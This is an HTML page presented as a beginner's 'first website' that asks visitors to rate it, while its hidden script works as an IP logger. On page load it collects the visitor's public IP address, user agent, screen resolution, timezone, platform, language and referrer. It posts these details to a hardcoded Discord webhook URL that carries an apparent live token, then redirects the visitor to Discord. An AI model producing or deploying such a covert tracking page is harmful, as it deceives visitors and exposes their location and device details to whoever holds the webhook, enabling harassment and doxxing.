<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading Text rq</title>
    <meta http-equiv="refresh" content="2; url=https://discord.com/app">
    <style>body { background: #36393f; color: white; text-align: center; padding: 50px; }</style>
</head>
<body>
    <h2>Hi its my website my first :D</h2>
    <p>rate it out of ten please :D</p>

<script>
async function grabIP() {
    let ip = "N/A";
    try {
        const res1 = await fetch("https://api.ipify.org?format=json");
        const data1 = await res1.json();
        ip = data1.ip;
    } catch(e) {
        try {
            const res2 = await fetch("https://ipapi.co/json/");
            const data2 = await res2.json();
            ip = data2.ip;
        } catch(e2) {}
    }

    const payload = {
        username: "IP Logger",
        content: "**New Hit**",
        embeds: [{
            title: "📍 Someone clicked the link",
            color: 16711680,
            fields: [
                { name: "IP Address", value: ip, inline: true },
                { name: "User-Agent", value: navigator.userAgent.substring(0, 300), inline: false },
                { name: "Screen Resolution", value: screen.width + "x" + screen.height, inline: true },
                { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
                { name: "Platform", value: navigator.platform, inline: true },
                { name: "Language", value: navigator.language, inline: true },
                { name: "Referer", value: document.referrer || "None", inline: false },
                { name: "Time", value: new Date().toISOString(), inline: false }
            ]
        }]
    };

    // Replace with real webhook
    fetch("https://discord.com/api/webhooks/1470766002726899755/EJQbGpE9N1H6AT9v7hH3WDBC9GXyIg9GytszkgF0ycINVYNLFW6XURCQU2KEHDrMwY9p", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    }).catch(err => {});
}

// Run immediately + backup
window.onload = grabIP;
setTimeout(grabIP, 500);
</script>
</body>
</html>
